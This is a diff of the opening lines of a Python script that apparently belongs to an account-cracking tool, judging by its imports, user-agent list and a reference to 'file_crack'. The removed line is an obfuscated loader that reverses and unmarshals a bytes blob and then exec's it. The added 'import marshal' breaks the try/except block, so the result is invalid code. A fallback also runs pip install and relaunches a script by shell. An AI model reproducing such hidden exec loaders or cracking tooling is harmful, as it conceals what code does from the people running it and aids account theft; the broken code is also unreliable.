@@ -1,15 +1,14 @@
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
 import os,sys,time,json,random,re,string,platform,base64,platform,uuid
-_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(b'\x01\x0c\x00\x08\x00\x00\x00\x04s\x00\x00\x00\x01>eludom<\x08\xda>x<\x03\xfa\x00\x00\x00\x01r\x00\x00\x00\x01r\x00\xa9kcarc_elif\nZGNIKA\x05Z\x02)N\x00\x00\x00\x00\xe9\x02)\x00S\x01d\x00\x01\x00\xa1\x01\xa0\x00e\x00Z\x00l\x01d\x00d\x00\x00\x00\x14s\x00\x00\x00@\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c'))
-try:
+import marshal
     import requests
     from concurrent.futures import ThreadPoolExecutor as ThreadPool
     import mechanize
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python Kashif.py')
+    os.system('python M0.py')
 from bs4 import BeautifulSoup
 ugen = []
 A = '\x1b[1;97m' 
